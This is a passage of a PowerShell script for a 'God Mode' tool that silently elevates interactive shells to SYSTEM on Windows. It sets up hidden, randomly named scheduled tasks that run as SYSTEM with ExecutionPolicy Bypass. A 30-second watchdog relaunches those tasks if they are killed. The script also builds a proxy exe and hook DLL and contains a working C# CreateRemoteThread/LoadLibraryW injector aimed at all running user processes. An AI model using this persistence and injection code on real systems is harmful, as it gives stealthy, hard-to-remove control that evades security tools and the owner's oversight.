        Remove-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name "EnableSmartScreen" -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\MicrosoftEdge\PhishingFilter" -Name "EnabledV9" -ErrorAction SilentlyContinue
    } catch {}

    # 14. NEW: Restore Remote UAC
    try {
        Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "LocalAccountTokenFilterPolicy" -ErrorAction SilentlyContinue
    } catch {}

    # 15. NEW: Restore Credential Guard / VBS
    try {
        Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard" -Name "EnableVirtualizationBasedSecurity" -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard" -Name "RequirePlatformSecurityFeatures" -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "LsaCfgFlags" -ErrorAction SilentlyContinue
    } catch {}

    # 16. NEW: Restore Windows Script Host
    try {
        Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Script Host\Settings" -Name "Enabled" -ErrorAction SilentlyContinue
    } catch {}

    Write-Log -Message "Dangerous mode disable attempt complete. Reboot strongly recommended for full restoration." -Type "INFO" -Color Yellow
    Write-DebugLog -FunctionName "Disable-DangerousMode" -Action "EXIT" -Message "Complete"
}

function Register-StealthTask {
    # Flap-proof monitor startup (the fix for "shells don't auto-elevate to SYSTEM
    # after [7]+reboot"). The prior logic unregistered ALL $GodModeTaskPrefix*
    # tasks whenever none was momentarily "Running" -- but right after
    # Start-ScheduledTask the task is briefly in a transitional (Queued/Ready)
    # state, not "Running", so a CONCURRENT -ToggleOn persistence layer (guardian
    # / Run key / WMI consumer / backup task firing within milliseconds at boot)
    # would Unregister-StealthTask + recreate it, KILLing Start-Monitoring
    # mid-startup. After a reboot this flapping left no stable monitor running ->
    # the WMI watcher + 5s polling never elevated interactive shells (whoami
    # stayed admin). Now: if a stealth task already EXISTS in ANY state, just
    # (re)start it and return -- NEVER unregister an existing one from here. Only
    # create a new stealth task when none exists. Disable-GodMode still calls
    # Unregister-StealthTask for teardown; the watchdog (Register-SystemWatchdog,
    # 30s) + the RestartCount 99 policy relaunch a truly-dead task.
    $existing = Get-ScheduledTask -TaskName "$GodModeTaskPrefix*" -ErrorAction SilentlyContinue
    if ($existing) {
        $running = $existing | Where-Object { $_.State -eq 'Running' }
        if ($running) {
            Write-Log -Message "Stealth monitoring task already running ($($running.TaskName)). Skipping re-registration to prevent flapping." -Type "INFO" -Color Gray
            return
        }
        # Exists but not Running -- inspect LastTaskResult to decide nudge vs
        # self-heal. The flap-proof path (do NOT unregister a healthy/starting
        # task) is preserved for a task that ran clean (LastTaskResult=0) or has
        # not run yet (267011 = "task has not yet run" sentinel).
        $nudge = $existing | Select-Object -First 1
        $lastResult = 0
        try { $nudgeInfo = $nudge | Get-ScheduledTaskInfo -ErrorAction SilentlyContinue; if ($nudgeInfo) { $lastResult = [int]$nudgeInfo.LastTaskResult } } catch {}
        if ($lastResult -eq 0 -or $lastResult -eq 267011) {
            try { Start-ScheduledTask -TaskName $nudge.TaskName -ErrorAction SilentlyContinue } catch {}
            Write-Log -Message "Stealth monitoring task exists ($($nudge.TaskName), state=$($nudge.State), lastResult=$lastResult); (re)started, no re-registration (flap-proof)." -Type "INFO" -Color Gray
            return
        }
        # SELF-HEAL: a nonzero LastTaskResult (e.g. 0x8007010B / 267 =
        # ERROR_DIRECTORY) means the -Launch action ran and DIED -- the
        # Start-Monitoring loop is not alive, so interactive shells never
        # auto-elevate (whoami -> admin). The prior logic just restarted it,
        # relaunching the SAME broken action forever. Drop the broken task and
        # fall through to the create path below, which now sets -WorkingDirectory
        # (the fix for ERROR_DIRECTORY: a SYSTEM task with no WorkingDirectory
        # can resolve to an inaccessible cwd -> 267 on launch -> monitor dies
        # -> shells stay admin). This is NOT the flap case (a flapping task is
        # mid-startup, LastTaskResult=0/267011, handled above); this only fires
        # for a task that genuinely crashed on its last run.
        Write-Log -Message "Stealth monitoring task BROKEN ($($nudge.TaskName), lastResult=$lastResult). Self-healing: unregister + recreate with WorkingDirectory=$GodModeInstallDir." -Type "WARN" -Color Yellow
        try { Unregister-ScheduledTask -TaskName $nudge.TaskName -Confirm:$false -ErrorAction SilentlyContinue } catch {}
        # Fall through to the create path (reuses the WorkingDirectory-fixed action).
    }

    # No stealth task exists (fresh install / first enable / after Disable-GodMode
    # tore everything down / after the self-heal above dropped a broken one) --
    # create one.
    $taskName = $GodModeTaskPrefix + (Get-Random -Minimum 10000 -Maximum 99999)

    # -WorkingDirectory is the fix for LastTaskResult 0x8007010B (267,
    # ERROR_DIRECTORY): a SYSTEM scheduled task with no WorkingDirectory can
    # resolve to an inaccessible/invalid cwd, making the -Launch action die
    # immediately -> no monitor loop -> interactive shells stay admin. Pin it to
    # the install dir (which exists and is readable by SYSTEM). The -Argument
    # string MUST use backtick-QUOTE (not backtick-DOLLAR-quote) around the
    # script path: backtick-quote embeds a literal " inside the double-quoted
    # -Argument so -File gets a properly quoted path; backtick-DOLLAR-quote
    # emits a literal $ and terminates the outer string early, leaking
    # $GodModeInstallScript + -Launch as a positional arg -> New-ScheduledTaskAction
    # throws "a positional parameter cannot be found" (the uncaught trap at the
    # Register-StealthTask create line that killed Enable-GodMode + left no
    # stealth monitor -> shells stayed admin). Regression: Test-GmProxySession.
    $action = New-ScheduledTaskAction -Execute "powershell.exe" `
        -Argument "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$GodModeInstallScript`" -Launch" `
        -WorkingDirectory $GodModeInstallDir

    $trigger = New-ScheduledTaskTrigger -AtStartup
    $principal = New-ScheduledTaskPrincipal -UserId "S-1-5-18" `
        -LogonType ServiceAccount -RunLevel Highest

    # Aggressive restart settings: auto-relaunch as SYSTEM if killed
    $settings = New-ScheduledTaskSettingsSet -RestartCount 99 -RestartInterval (New-TimeSpan -Minutes 1) -StartWhenAvailable -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable:$false

    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger `
        -Principal $principal -Settings $settings -Force | Out-Null

    # Start the task immediately so monitoring begins now
    try {
        Start-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
    } catch {}
}

function Unregister-StealthTask {
    Get-ScheduledTask -TaskName "$GodModeTaskPrefix*" -ErrorAction SilentlyContinue |
        Unregister-ScheduledTask -Confirm:$false -ErrorAction SilentlyContinue
}

function Register-SystemWatchdog {
    Write-DebugLog -FunctionName "Register-SystemWatchdog" -Action "ENTRY"

    # Create a watchdog script file that checks if the stealth task is running and relaunches it
    $WatchdogScriptPath = Join-Path $GodModeInstallDir "watchdog.ps1"
    $WatchdogContent = @'
# God Mode SYSTEM Watchdog
# Self-healing: a stealth task that is broken (nonzero LastTaskResult, not the
# 267011 "never ran" sentinel) is dropped + recreated with -WorkingDirectory
# (the fix for ERROR_DIRECTORY 0x8007010B that kills the -Launch monitor and
# leaves interactive shells stuck as admin). A Running task is left alone; a
# clean/never-run task is just nudged (flap-proof).
$running = Get-ScheduledTask -TaskName '__PREFIX__*' -ErrorAction SilentlyContinue | Where-Object { $_.State -eq 'Running' }
if ($running) { return }
$stealth = Get-ScheduledTask -TaskName '__PREFIX__*' -ErrorAction SilentlyContinue | Select-Object -First 1
if ($stealth) {
    $lastResult = 0
    try { $wdInfo = $stealth | Get-ScheduledTaskInfo -ErrorAction SilentlyContinue; if ($wdInfo) { $lastResult = [int]$wdInfo.LastTaskResult } } catch {}
    if ($lastResult -ne 0 -and $lastResult -ne 267011) {
        try { Unregister-ScheduledTask -TaskName $stealth.TaskName -Confirm:$false -ErrorAction SilentlyContinue } catch {}
        $stealth = $null
    } else {
        Start-ScheduledTask -TaskName $stealth.TaskName -ErrorAction SilentlyContinue
        return
    }
}
if (-not $stealth) {
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"__SCRIPT__`" -Launch" -WorkingDirectory "__WORKDIR__"
    $trigger = New-ScheduledTaskTrigger -AtStartup
    $principal = New-ScheduledTaskPrincipal -UserId "S-1-5-18" -LogonType ServiceAccount -RunLevel Highest
    $settings = New-ScheduledTaskSettingsSet -RestartCount 99 -RestartInterval (New-TimeSpan -Minutes 1) -StartWhenAvailable
    $taskName = "__PREFIX__" + (Get-Random -Minimum 10000 -Maximum 99999)
    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force | Out-Null
    Start-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
}
'@
    $WatchdogContent = $WatchdogContent.Replace('__PREFIX__', $GodModeTaskPrefix)
    $WatchdogContent = $WatchdogContent.Replace('__SCRIPT__', $GodModeInstallScript)
    $WatchdogContent = $WatchdogContent.Replace('__WORKDIR__', $GodModeInstallDir)

    # Write to temp first, then copy via SYSTEM into hardened install dir
    $TempWatchdog = Join-Path $env:TEMP "gm_watchdog_$(Get-Random).ps1"
    Set-Content -Path $TempWatchdog -Value $WatchdogContent -Encoding UTF8 -Force
    $copyResult = Invoke-AsSystem -Command "cmd /c copy /y `"$TempWatchdog`" `"$WatchdogScriptPath`""
    if (-not $copyResult.Success) {
        Write-Log -Message "Watchdog script copy to install dir failed: $($copyResult.Output)" -Type "WARN" -Color Yellow
    }
    Remove-Item -Path $TempWatchdog -Force -ErrorAction SilentlyContinue

    # Create the watchdog scheduled task (30-second heartbeat, runs as SYSTEM, auto-restarts if killed)
    $WatchdogAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$WatchdogScriptPath`""
    $WatchdogTrigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Seconds 30) -RepetitionDuration (New-TimeSpan -Days 9999)
    $WatchdogPrincipal = New-ScheduledTaskPrincipal -UserId "S-1-5-18" -LogonType ServiceAccount -RunLevel Highest
    $WatchdogSettings = New-ScheduledTaskSettingsSet -RestartCount 99 -RestartInterval (New-TimeSpan -Minutes 1) -StartWhenAvailable -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable:$false

    Register-ScheduledTask -TaskName $GodModeWatchdogName -Action $WatchdogAction -Trigger $WatchdogTrigger -Principal $WatchdogPrincipal -Settings $WatchdogSettings -Force -ErrorAction SilentlyContinue | Out-Null
    Write-Log -Message "SYSTEM watchdog registered (30-second heartbeat, auto-restart on kill)." -Type "INFO" -Color Gray
    Write-DebugLog -FunctionName "Register-SystemWatchdog" -Action "EXIT" -Message "Success"
}

function Unregister-SystemWatchdog {
    Write-DebugLog -FunctionName "Unregister-SystemWatchdog" -Action "ENTRY"
    if (Get-ScheduledTask -TaskName $GodModeWatchdogName -ErrorAction SilentlyContinue) {
        Unregister-ScheduledTask -TaskName $GodModeWatchdogName -Confirm:$false -ErrorAction SilentlyContinue
    }
    $WatchdogScriptPath = Join-Path $GodModeInstallDir "watchdog.ps1"
    if (Test-Path $WatchdogScriptPath) {
        $delResult = Invoke-AsSystem -Command "cmd /c del /f /q `"$WatchdogScriptPath`""
        if (-not $delResult.Success) {
            Write-Log -Message "Failed to remove watchdog script from hardened dir: $($delResult.Output)" -Type "WARN" -Color Yellow
        }
    }
    Write-Log -Message "SYSTEM watchdog removed." -Type "INFO" -Color Gray
    Write-DebugLog -FunctionName "Unregister-SystemWatchdog" -Action "EXIT" -Message "Success"
}

function Block-TaskManager {
    Write-DebugLog -FunctionName "Block-TaskManager" -Action "ENTRY"
    try {
        # Remove any existing IFEO Debugger redirect so taskmgr opens normally
        $IfeoPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe"
        if (Test-Path $IfeoPath) {
            Remove-ItemProperty -Path $IfeoPath -Name "Debugger" -ErrorAction SilentlyContinue
            $RegKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe", [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree, [System.Security.AccessControl.RegistryRights]::ChangePermissions)
            if ($RegKey) {
                $Acl = $RegKey.GetAccessControl()
                $Acl.SetAccessRuleProtection($false, $false)
                $RegKey.SetAccessControl($Acl)
                $RegKey.Close()
            }
            Remove-Item -Path $IfeoPath -Force -ErrorAction SilentlyContinue
        }
        # Remove classic DisableTaskMgr policy so taskmgr opens for everyone
        $PolicyPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
        if (Test-Path $PolicyPath) {
            Remove-ItemProperty -Path $PolicyPath -Name "DisableTaskMgr" -ErrorAction SilentlyContinue
        }
        # Clean up any old proxy files from hardened dir
        $ProxyPath = Join-Path $GodModeInstallDir "taskmgr_proxy.ps1"
        $TaskMgrCopy = Join-Path $GodModeInstallDir "taskmgr_real.exe"
        if (Test-Path $ProxyPath) {
            $delResult = Invoke-AsSystem -Command "cmd /c del /f /q `"$ProxyPath`""
            if (-not $delResult.Success) {
                Write-Log -Message "Failed to remove old taskmgr proxy: $($delResult.Output)" -Type "WARN" -Color Yellow
            }
        }
        if (Test-Path $TaskMgrCopy) {
            $delResult = Invoke-AsSystem -Command "cmd /c del /f /q `"$TaskMgrCopy`""
            if (-not $delResult.Success) {
                Write-Log -Message "Failed to remove old taskmgr copy: $($delResult.Output)" -Type "WARN" -Color Yellow
            }
        }
        Write-Log -Message "Task Manager unblocked (IFEO removed). Watcher will elevate it to SYSTEM in-place." -Type "INFO" -Color Gray
    } catch {
        Write-Log -Message "Task Manager unblock failed: $_" -Type "WARN" -Color Yellow
    }
    Write-DebugLog -FunctionName "Block-TaskManager" -Action "EXIT" -Message "Complete"
}

function Unblock-TaskManager {
    Write-DebugLog -FunctionName "Unblock-TaskManager" -Action "ENTRY"
    try {
        $IfeoPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe"
        if (Test-Path $IfeoPath) {
            Remove-ItemProperty -Path $IfeoPath -Name "Debugger" -ErrorAction SilentlyContinue
            $RegKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe", [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree, [System.Security.AccessControl.RegistryRights]::ChangePermissions)
            if ($RegKey) {
                $Acl = $RegKey.GetAccessControl()
                $Acl.SetAccessRuleProtection($false, $false)
                $RegKey.SetAccessControl($Acl)
                $RegKey.Close()
            }
            Remove-Item -Path $IfeoPath -Force -ErrorAction SilentlyContinue
        }
        $PolicyPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
        if (Test-Path $PolicyPath) {
            Remove-ItemProperty -Path $PolicyPath -Name "DisableTaskMgr" -ErrorAction SilentlyContinue
        }
        # Remove proxy launcher and taskmgr copy from hardened dir via SYSTEM
        $ProxyPath = Join-Path $GodModeInstallDir "taskmgr_proxy.ps1"
        $TaskMgrCopy = Join-Path $GodModeInstallDir "taskmgr_real.exe"
        if (Test-Path $ProxyPath) {
            $delResult = Invoke-AsSystem -Command "cmd /c del /f /q `"$ProxyPath`""
            if (-not $delResult.Success) {
                Write-Log -Message "Failed to remove taskmgr proxy from hardened dir: $($delResult.Output)" -Type "WARN" -Color Yellow
            }
        }
        if (Test-Path $TaskMgrCopy) {
            $delResult = Invoke-AsSystem -Command "cmd /c del /f /q `"$TaskMgrCopy`""
            if (-not $delResult.Success) {
                Write-Log -Message "Failed to remove taskmgr copy from hardened dir: $($delResult.Output)" -Type "WARN" -Color Yellow
            }
        }
        Write-Log -Message "Task Manager unblocked." -Type "INFO" -Color Gray
    } catch {
        Write-Log -Message "Task Manager unblock failed: $_" -Type "WARN" -Color Yellow
    }
    Write-DebugLog -FunctionName "Unblock-TaskManager" -Action "EXIT" -Message "Complete"
}

function Install-ProcessHook {
    [CmdletBinding()]
    param([switch]$Force)
    Write-DebugLog -FunctionName "Install-ProcessHook" -Action "ENTRY"
    $success = $false
    try {
        $DriverDir = Join-Path $PSScriptRoot "driver"
        $BuildOutDir = Join-Path $env:TEMP "GodModeBuild"
        if ($Force -and (Test-Path $BuildOutDir)) {
            Remove-Item -Path $BuildOutDir -Recurse -Force -ErrorAction SilentlyContinue
        }
        $ProxyExe = Join-Path $BuildOutDir "gmproxy.exe"
        $HookDll = Join-Path $BuildOutDir "gmhook.dll"
        $BuildScript = Join-Path $DriverDir "build.ps1"
    $BuildLog = Join-Path (Get-GodModeLogDir) "GodMode_DriverBuild.log"

    # --- Auto-build if binaries are missing ---
        $NeedBuild = (-not (Test-Path $ProxyExe)) -or (-not (Test-Path $HookDll))
        if ($NeedBuild) {
            # Pre-flight: check if any compiler is available before attempting build
            $CompilerStatus = Get-CompilerStatus
            if ($CompilerStatus -eq "MSYS2-FOUND-NO-GCC") {
                # Auto-install MSYS2 GCC if MSYS2 is present but gcc is missing
                $MsysRoot = Get-MSYS2Root
                if ($MsysRoot) {
                    $GccInstalled = Install-MSYS2GCC -MsysRoot $MsysRoot
                    if ($GccInstalled) {
                        $UcrtBin = Join-Path $MsysRoot "ucrt64\bin"
                        if (Test-Path $UcrtBin) {
                            $env:PATH = "$UcrtBin;$env:PATH"
                            Write-DebugLog -FunctionName "Install-ProcessHook" -Action "INFO" -Message "Added $UcrtBin to PATH after auto-install"
                        }
                        # Re-check compiler status after auto-install
                        $CompilerStatus = Get-CompilerStatus
                    } else {
                        Write-Log -Message "MSYS2 GCC auto-install failed. Cannot compile C components." -Type "ERROR" -Color Red
                        Write-DebugLog -FunctionName "Install-ProcessHook" -Action "ERROR" -Message "MSYS2 GCC auto-install failed in $MsysRoot"
                    }
                }
            }
            # If still no compiler, abort process hook installation with clear cause
            if ($CompilerStatus -eq $null -or $CompilerStatus -eq "MSYS2-FOUND-NO-GCC") {
                $Cause = if ($CompilerStatus -eq "MSYS2-FOUND-NO-GCC") {
                    "MSYS2 is installed but gcc.exe is still missing (pacman may have failed or requires manual refresh)."
                } else {
                    "No C compiler detected (MSVC cl.exe, MinGW gcc, MSYS2 gcc, or Linux x86_64-w64-mingw32-gcc). Install MSYS2 or Visual Studio Build Tools."
                }
                Write-Log -Message "C components need compilation but no compiler is available: $Cause Process hook installation aborted." -Type "ERROR" -Color Red
                Write-DebugLog -FunctionName "Install-ProcessHook" -Action "ERROR" -Message "Compilation impossible: $Cause"
                return
            }
            if (Test-Path $BuildScript) {
                Write-Log -Message "C components missing (gmproxy.exe or gmhook.dll). Running auto-build: $BuildScript" -Type "INFO" -Color Yellow
                Write-DebugLog -FunctionName "Install-ProcessHook" -Action "INFO" -Message "Auto-build starting: $BuildScript (compiler: $CompilerStatus)"
                try {
                    $PwshPath = Get-Command "pwsh" -ErrorAction SilentlyContinue
                    $PsPath = Get-Command "powershell" -ErrorAction SilentlyContinue
                    $ShellExe = if ($PwshPath) { $PwshPath.Source } elseif ($PsPath) { $PsPath.Source } else { $null }
                    if (-not $ShellExe) {
                        Write-Log -Message "Neither pwsh nor powershell found in PATH. Cannot auto-build C components." -Type "ERROR" -Color Red
                        Write-DebugLog -FunctionName "Install-ProcessHook" -Action "ERROR" -Message "No PowerShell interpreter found for auto-build"
                        return
                    } else {
                        # If gcc is missing from PATH but MSYS2 is installed in a known dir, temporarily add it
                        $MsysBin = Get-MSYS2Path
                        if ($MsysBin -and -not (Get-Command "gcc" -ErrorAction SilentlyContinue)) {
                            $env:PATH = "$MsysBin;$env:PATH"
                            Write-DebugLog -FunctionName "Install-ProcessHook" -Action "INFO" -Message "Temporarily added MSYS2 bin to PATH: $MsysBin"
                        }
                        $BuildOutput = & $ShellExe -NoProfile -ExecutionPolicy Bypass -File "$BuildScript" -OutDir "$BuildOutDir" 2>&1
                        $BuildOutput | Out-File -FilePath $BuildLog -Encoding UTF8 -Force
                        $BuildExit = $LASTEXITCODE
                        # Small pause to ensure filesystem is consistent before Test-Path checks
                        Start-Sleep -Milliseconds 250
                        if ($BuildExit -ne 0) {
                            Write-Log -Message "Auto-build failed (exit $BuildExit). Full log: $BuildLog" -Type "ERROR" -Color Red
                            Write-DebugLog -FunctionName "Install-ProcessHook" -Action "ERROR" -Message "Auto-build failed exit=$BuildExit"
                            if (Test-Path $BuildLog) {
                                $BuildErr = Get-Content -Raw $BuildLog -ErrorAction SilentlyContinue
                                Write-DebugLog -FunctionName "Install-ProcessHook" -Action "ERROR" -Message "Build output: $BuildErr"
                            }
                            # Abort process hook installation if build failed
                            Write-Log -Message "C component build failed. Process hook installation aborted." -Type "ERROR" -Color Red
                            Write-DebugLog -FunctionName "Install-ProcessHook" -Action "ERROR" -Message "Build failed - binaries missing. Aborting hook install."
                            return
                        } else {
                            Write-Log -Message "Auto-build succeeded." -Type "INFO" -Color Green
                            Write-DebugLog -FunctionName "Install-ProcessHook" -Action "INFO" -Message "Auto-build succeeded"
                        }
                    }
                } catch {
                    Write-Log -Message "Auto-build exception: $_" -Type "ERROR" -Color Red
                    Write-DebugLog -FunctionName "Install-ProcessHook" -Action "ERROR" -Message "Auto-build exception: $_"
                    Write-Log -Message "C component build exception. Process hook installation aborted." -Type "ERROR" -Color Red
                    return
                }
            } else {
                Write-Log -Message "Build script not found: $BuildScript. Cannot auto-build C components." -Type "ERROR" -Color Red
                Write-DebugLog -FunctionName "Install-ProcessHook" -Action "ERROR" -Message "Build script missing: $BuildScript"
                return
            }
        }

        # Final binary verification before installation
        if (-not (Test-Path $ProxyExe) -or -not (Test-Path $HookDll)) {
            $Missing = @()
            if (-not (Test-Path $ProxyExe)) { $Missing += "gmproxy.exe" }
            if (-not (Test-Path $HookDll)) { $Missing += "gmhook.dll" }
            Write-Log -Message "C binaries still missing after build: $($Missing -join ', '). Process hook installation aborted. Check $BuildLog for details." -Type "ERROR" -Color Red
            Write-DebugLog -FunctionName "Install-ProcessHook" -Action "ERROR" -Message "Missing binaries: $($Missing -join ', ') - aborting hook install"
            return
        }

        # Ensure install directory exists before copying binaries
        if (-not (Test-Path $GodModeInstallDir)) { New-Item -ItemType Directory -Path $GodModeInstallDir -Force | Out-Null }

        $destProxy = Join-Path $GodModeInstallDir "gmproxy.exe"
        $destHook  = Join-Path $GodModeInstallDir "gmhook.dll"

        # --- Copy gmproxy.exe with explicit verification (Copy-Item -EA SilentlyContinue hides real errors) ---
        if (-not (Test-Path $ProxyExe)) {
            Write-Log -Message "gmproxy.exe still missing after build attempt. Skipping IFEO proxy install." -Type "WARN" -Color Yellow
            Write-DebugLog -FunctionName "Install-ProcessHook" -Action "WARN" -Message "gmproxy.exe still missing after build"
        } else {
            $copyOk = $false
            try {
                [System.IO.File]::Copy($ProxyExe, $destProxy, $true)
                Start-Sleep -Milliseconds 100
                if (Test-Path $destProxy) { $copyOk = $true }
            } catch {
                Write-DebugLog -FunctionName "Install-ProcessHook" -Action "WARN" -Message "File.Copy gmproxy.exe failed: $_"
                # Fallback: try cmd copy
                try {
                    $null = & cmd /c "copy `"$ProxyExe`" `"$destProxy`" /Y" 2>&1
                    Start-Sleep -Milliseconds 100
                    if (Test-Path $destProxy) { $copyOk = $true }
                } catch {
                    Write-DebugLog -FunctionName "Install-ProcessHook" -Action "WARN" -Message "cmd copy gmproxy.exe fallback failed: $_"
                }
            }
            if ($copyOk) {
                Write-Log -Message "gmproxy.exe installed to $destProxy" -Type "INFO" -Color Gray
            } else {
                # SYSTEM fallback: hardened directory denies admin write, but SYSTEM has FullControl
                try {
                    $sysResult = Invoke-AsSystem -Command "cmd /c copy `"$ProxyExe`" `"$destProxy`" /Y"
                    Start-Sleep -Milliseconds 100
                    if ($sysResult.Success -and (Test-Path $destProxy)) { $copyOk = $true }
                    Write-DebugLog -FunctionName "Install-ProcessHook" -Action "INFO" -Message "Invoke-AsSystem copy gmproxy.exe result: $($sysResult.Success)"
                } catch {
                    Write-DebugLog -FunctionName "Install-ProcessHook" -Action "WARN" -Message "Invoke-AsSystem copy gmproxy.exe failed: $_"
                }
                if (-not $copyOk) {
                    Write-Log -Message "gmproxy.exe copy failed (all methods)." -Type "WARN" -Color Yellow
                    Write-DebugLog -FunctionName "Install-ProcessHook" -Action "WARN" -Message "gmproxy.exe not present at destination after all copy attempts"
                }
            }
        }

        # --- Copy gmhook.dll with explicit verification ---
        if (-not (Test-Path $HookDll)) {
            Write-Log -Message "gmhook.dll still missing after build attempt. Skipping DLL injection." -Type "WARN" -Color Yellow
            Write-DebugLog -FunctionName "Install-ProcessHook" -Action "WARN" -Message "gmhook.dll still missing after build"
        } else {
            $copyOk = $false
            try {
                [System.IO.File]::Copy($HookDll, $destHook, $true)
                Start-Sleep -Milliseconds 100
                if (Test-Path $destHook) { $copyOk = $true }
            } catch {
                Write-DebugLog -FunctionName "Install-ProcessHook" -Action "WARN" -Message "File.Copy gmhook.dll failed: $_"
                try {
                    $null = & cmd /c "copy `"$HookDll`" `"$destHook`" /Y" 2>&1
                    Start-Sleep -Milliseconds 100
                    if (Test-Path $destHook) { $copyOk = $true }
                } catch {
                    Write-DebugLog -FunctionName "Install-ProcessHook" -Action "WARN" -Message "cmd copy gmhook.dll fallback failed: $_"
                }
            }
            if ($copyOk) {
                Write-Log -Message "gmhook.dll installed to $destHook" -Type "INFO" -Color Gray
            } else {
                # SYSTEM fallback for hardened directory
                try {
                    $sysResult = Invoke-AsSystem -Command "cmd /c copy `"$HookDll`" `"$destHook`" /Y"
                    Start-Sleep -Milliseconds 100
                    if ($sysResult.Success -and (Test-Path $destHook)) { $copyOk = $true }
                    Write-DebugLog -FunctionName "Install-ProcessHook" -Action "INFO" -Message "Invoke-AsSystem copy gmhook.dll result: $($sysResult.Success)"
                } catch {
                    Write-DebugLog -FunctionName "Install-ProcessHook" -Action "WARN" -Message "Invoke-AsSystem copy gmhook.dll failed: $_"
                }
                if (-not $copyOk) {
                    Write-Log -Message "gmhook.dll copy failed (all methods). Skipping DLL injection." -Type "WARN" -Color Yellow
                    Write-DebugLog -FunctionName "Install-ProcessHook" -Action "WARN" -Message "gmhook.dll not present at destination after all copy attempts"
                }
            }
        }

        # Success means the proxy exists; DLL injection is non-critical
        $success = (Test-Path $destProxy)
        Write-DebugLog -FunctionName "Install-ProcessHook" -Action "INFO" -Message "destProxy exists=$success, destHook exists=$(Test-Path $destHook)"

        # --- Batch inject gmhook.dll into ALL running user processes ---
        if (Test-Path $destHook) {
            $InjectorType = @"
using System;
using System.Runtime.InteropServices;
public class GmInjector {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);

    public const uint PROCESS_VM_OPERATION = 0x0008;
    public const uint PROCESS_VM_WRITE = 0x0020;
    public const uint PROCESS_CREATE_THREAD = 0x0002;
    public const uint MEM_COMMIT = 0x1000;
    public const uint MEM_RESERVE = 0x2000;
    public const uint PAGE_READWRITE = 0x04;

    public static bool Inject(int pid, string dllPath) {
        IntPtr hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD, false, pid);
        if (hProcess == IntPtr.Zero) return false;
        try {
            uint pathLen = (uint)((dllPath.Length + 1) * 2);
            IntPtr alloc = VirtualAllocEx(hProcess, IntPtr.Zero, pathLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (alloc == IntPtr.Zero) return false;
            byte[] bytes = System.Text.Encoding.Unicode.GetBytes(dllPath + '\0');
            uint written;
            if (!WriteProcessMemory(hProcess, alloc, bytes, (uint)bytes.Length, out written)) return false;
            IntPtr hKernel = GetModuleHandle("kernel32.dll");
            IntPtr pLoadLibrary = GetProcAddress(hKernel, "LoadLibraryW");
            if (pLoadLibrary == IntPtr.Zero) return false;
            uint tid;
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, pLoadLibrary, alloc, 0, out tid);
            if (hThread == IntPtr.Zero) return false;
            CloseHandle(hThread);
            return true;
        } finally {
            CloseHandle(hProcess);
        }
    }
}
"@
            try {
                if (-not ([System.Management.Automation.PSTypeName]'GmInjector').Type) {
                    Add-Type -TypeDefinition $InjectorType -ErrorAction SilentlyContinue | Out-Null
                }
                # Shell/launcher hosts are NEVER injected with gmhook.dll. PowerShell
                # (pwsh/powershell) and cmd launch native commands via CreateProcessW as
                # their core job; in-process IAT hooking of those calls destabilizes the
                # host and faults with 0xC0000005 inside Kernel32.CreateProcess (a native
